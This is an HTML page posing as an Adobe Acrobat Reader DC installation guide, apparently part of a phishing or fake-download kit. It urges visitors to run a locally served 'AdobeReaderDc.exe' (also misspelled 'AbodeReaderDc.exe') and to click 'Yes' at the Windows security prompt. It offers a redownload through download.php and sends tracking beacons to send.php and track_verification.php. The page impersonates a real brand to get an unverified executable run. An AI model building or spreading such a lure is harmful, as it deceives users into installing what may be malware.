<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Installation Guide - Adobe Acrobat Reader DC</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #f7cfc6 0%, #f5b7a8 100%);
      min-height: 100vh;
      padding: 40px 20px;
      color: #8B4513;
    }

    .container {
      max-width: 900px;
      margin: 0 auto;
      background: linear-gradient(145deg, #ffffff, #f8f9fa);
      border-radius: 20px;
      padding: 50px;
      box-shadow: 0 25px 80px rgba(139, 69, 19, 0.12);
      border: 1px solid rgba(205, 92, 92, 0.1);
      position: relative;
      overflow: hidden;
    }

    .container::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #DC143C, #B22222, #A0522D);
    }

    .header {
      text-align: center;
      margin-bottom: 50px;
      position: relative;
    }

    .adobe-logo {
      width: 80px;
      height: 80px;
      background: linear-gradient(135deg, #DC143C, #B22222);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 28px;
      font-weight: bold;
      margin: 0 auto 20px;
      box-shadow: 0 10px 30px rgba(220, 20, 60, 0.3);
    }

    .header h1 {
      font-size: 2.8rem;
      font-weight: 700;
      margin-bottom: 12px;
      background: linear-gradient(135deg, #DC143C, #B22222);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .header p {
      font-size: 1.2rem;
      color: #CD5C5C;
      font-weight: 400;
      opacity: 0.9;
    }

    .windows-only {
      background: linear-gradient(135deg, #fff5f5, #ffe8e8);
      color: #8B4513;
      padding: 15px 25px;
      border-radius: 12px;
      text-align: center;
      margin-bottom: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      border: 1px solid rgba(220, 20, 60, 0.2);
      box-shadow: 0 4px 16px rgba(220, 20, 60, 0.1);
    }

    .steps-container {
      display: flex;
      flex-direction: column;
      gap: 28px;
      position: relative;
    }

    .steps-container::before {
      content: '';
      position: absolute;
      left: 19px;
      top: 50px;
      bottom: 50px;
      width: 2px;
      background: linear-gradient(180deg, #DC143C, #B22222);
      opacity: 0.3;
    }

    .step {
      display: flex;
      align-items: flex-start;
      gap: 24px;
      padding: 30px;
      background: linear-gradient(145deg, #ffffff, #fefefe);
      border-radius: 16px;
      border: 1px solid rgba(220, 20, 60, 0.1);
      box-shadow: 0 8px 32px rgba(139, 69, 19, 0.08);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .step::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(90deg, transparent, #DC143C, transparent);
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .step:hover {
      transform: translateY(-4px);
      box-shadow: 0 15px 45px rgba(139, 69, 19, 0.15);
    }

    .step:hover::before {
      opacity: 1;
    }

    .step-number {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      background: linear-gradient(135deg, #DC143C, #B22222);
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      font-weight: bold;
      flex-shrink: 0;
      box-shadow: 0 6px 20px rgba(220, 20, 60, 0.3);
      position: relative;
    }

    .step-number::after {
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: linear-gradient(135deg, #DC143C, #B22222);
      opacity: 0.2;
      transform: scale(0);
      transition: transform 0.3s ease;
    }

    .step:hover .step-number::after {
      transform: scale(1.3);
    }

    .step-content {
      flex: 1;
    }

    .step-content h3 {
      font-size: 1.4rem;
      color: #8B4513;
      margin-bottom: 12px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .step-icon {
      width: 24px;
      height: 24px;
      background: linear-gradient(135deg, #DC143C, #B22222);
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 14px;
    }

    .step-content p {
      color: #555;
      line-height: 1.6;
      font-size: 1rem;
      margin-bottom: 8px;
    }

    .step-note {
      background: linear-gradient(135deg, #fff5f5, #ffe8e8);
      padding: 12px 16px;
      border-radius: 8px;
      border-left: 3px solid #DC143C;
      font-size: 0.9rem;
      color: #8B4513;
      margin-top: 12px;
    }

    .action-buttons {
      display: flex;
      gap: 15px;
      justify-content: center;
      margin-top: 40px;
    }

    .action-btn {
      padding: 14px 28px;
      border-radius: 12px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 10px;
      border: none;
    }

    .primary-btn {
      background: linear-gradient(135deg, #DC143C, #B22222);
      color: white;
      box-shadow: 0 6px 20px rgba(220, 20, 60, 0.3);
    }

    .primary-btn:hover {
      background: linear-gradient(135deg, #B22222, #A0522D);
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(220, 20, 60, 0.4);
    }

    .secondary-btn {
      background: linear-gradient(135deg, #ffffff, #f8f9fa);
      color: #DC143C;
      border: 2px solid #DC143C;
    }

    .secondary-btn:hover {
      background: linear-gradient(135deg, #fff5f5, #ffe8e8);
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(220, 20, 60, 0.15);
    }

    .download-link {
      text-align: center;
      margin-top: 30px;
    }

    .download-link a {
      color: #DC143C;
      text-decoration: none;
      font-size: 0.95rem;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 10px 20px;
      border-radius: 8px;
      transition: all 0.3s ease;
      background: linear-gradient(135deg, #fff5f5, #ffe8e8);
      border: 1px solid rgba(220, 20, 60, 0.2);
    }

    .download-link a:hover {
      background: linear-gradient(135deg, #ffe8e8, #ffd6d6);
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(220, 20, 60, 0.15);
    }

    .completion-badge {
      text-align: center;
      margin-top: 40px;
      padding: 24px;
      background: linear-gradient(135deg, #e8f5e8, #f0f8f0);
      border-radius: 12px;
      border: 1px solid #4caf50;
    }

    .completion-badge h3 {
      color: #2e7d32;
      font-size: 1.3rem;
      margin-bottom: 8px;
    }

    .completion-badge p {
      color: #388e3c;
      font-size: 0.95rem;
    }

    @media (max-width: 768px) {
      body {
        padding: 20px 15px;
      }

      .container {
        padding: 30px 20px;
      }

      .header h1 {
        font-size: 2.2rem;
      }

      .header p {
        font-size: 1rem;
      }

      .adobe-logo {
        width: 60px;
        height: 60px;
        font-size: 24px;
      }

      .step {
        padding: 24px 20px;
        gap: 20px;
      }

      .step-number {
        width: 42px;
        height: 42px;
        font-size: 18px;
      }

      .step-content h3 {
        font-size: 1.2rem;
      }

      .step-content p {
        font-size: 0.95rem;
      }

      .steps-container::before {
        left: 21px;
      }

      .action-buttons {
        flex-direction: column;
      }

      .action-btn {
        width: 100%;
        justify-content: center;
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 25px 15px;
      }

      .header h1 {
        font-size: 1.9rem;
      }

      .step {
        flex-direction: column;
        align-items: center;
        text-align: center;
        gap: 16px;
      }

      .steps-container::before {
        display: none;
      }
    }

    /* Subtle animations */
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .step {
      animation: fadeInUp 0.6s ease-out;
      animation-fill-mode: both;
    }

    .step:nth-child(1) { animation-delay: 0.1s; }
    .step:nth-child(2) { animation-delay: 0.2s; }
    .step:nth-child(3) { animation-delay: 0.3s; }
    .step:nth-child(4) { animation-delay: 0.4s; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img width="100" src="./assets/icon.png" alt="Adobe Logo">
      <h1>Installation Guide</h1>
      <p>Follow these simple steps to install Adobe Acrobat Reader DC on your computer</p>
    </div>

    <div class="windows-only">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="20" height="20" alt="Windows">
      <span>This application is designed for Windows operating system only</span>
    </div>

    <div class="steps-container">
      <div class="step">
        <div class="step-number">1</div>
        <div class="step-content">
          <h3><span class="step-icon">📁</span>Locate Your Download</h3>
          <p>Find the Adobe Acrobat Reader DC installer file in your Downloads folder and look for <strong>AdobeReaderDc.exe</strong></p>
          <div class="step-note">
            💡 The file size should be approximately 15-200 MB
          </div>
        </div>
      </div>

      <div class="step">
        <div class="step-number">2</div>
        <div class="step-content">
          <h3><span class="step-icon">▶️</span>Run the Installer</h3>
          <p>Double-click the AbodeReaderDc.exe file to begin the installation process</p>
          <div class="step-note">
            🔐 You may see a Windows security prompt - click "Yes" to continue
          </div>
        </div>
      </div>

      <div class="step">
        <div class="step-number">3</div>
        <div class="step-content">
          <h3><span class="step-icon">⚙️</span>Complete Installation</h3>
          <p>The installer will automatically download and install Adobe Acrobat Reader DC. This may take 3-5 minutes depending on your internet connection</p>
          <div class="step-note">
            ⏱️ No user interaction required during this step - Reader installs automatically
          </div>
        </div>
      </div>

      <div class="step">
        <div class="step-number">4</div>
        <div class="step-content">
          <h3><span class="step-icon">🚀</span>Launch Reader</h3>
          <p>Once installed, Adobe Acrobat Reader DC will launch automatically. You can also find it in your Start menu or desktop to start viewing and working with PDF documents</p>
          <div class="step-note">
            🎉 Sign in with your Adobe ID to access additional features and cloud services
          </div>
        </div>
      </div>
    </div>

    <div class="download-link">
      <a href="download.php" onclick="trackRedownload()">
        ⬇️ Download Windows Installer Again
      </a>
    </div>

    <div class="completion-badge">
      <h3>🎯 Installation Complete!</h3>
      <p>You're all set to start using Adobe Acrobat Reader DC for viewing, printing, and annotating PDF documents</p>
    </div>
  </div>

  <script>
    function openWindowsDownloads() {
      window.open("file:///C:/Users/" + (process.env.USERNAME || "User") + "/Downloads");
    }

    function trackRedownload() {
      // Send notification for redownload attempt
      fetch('send.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'download_attempt' })
      });

      fetch('track_verification.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'download_attempt' })
      });
    }
  </script>
</body>
</html>
